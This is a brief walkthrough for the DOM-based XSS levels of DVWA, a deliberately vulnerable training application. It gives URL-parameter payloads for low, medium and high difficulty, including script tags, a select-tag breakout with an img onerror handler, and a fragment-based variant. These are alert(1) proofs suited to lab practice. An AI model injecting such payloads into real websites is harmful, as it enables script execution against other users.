*CROSS-SITE SCRIPTING (XSS) DVWA*

DOM-BASED XSS

LOW LEVEL
1. Insert script below on the parameter URL. Make sure to clear 'lang' first before inserting the script.
<script>alert(1)</script>

MEDIUM LEVEL
1. You can check cheatsheet for DOM-Based XSS on this link. Make sure to read clearly.

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet - XSS Cheatsheet
2. Then, you can put this script on te parameter URL as usual. Make sure to clear 'lang' first before inserting the script.

</select><img%20src/onerror=alert(1)>
@
>/option></select><img src='x' onerror='alert(1)'>

HIGH LEVEL
1. Put this script on the parameter URL.
#<script>alert(1)</script>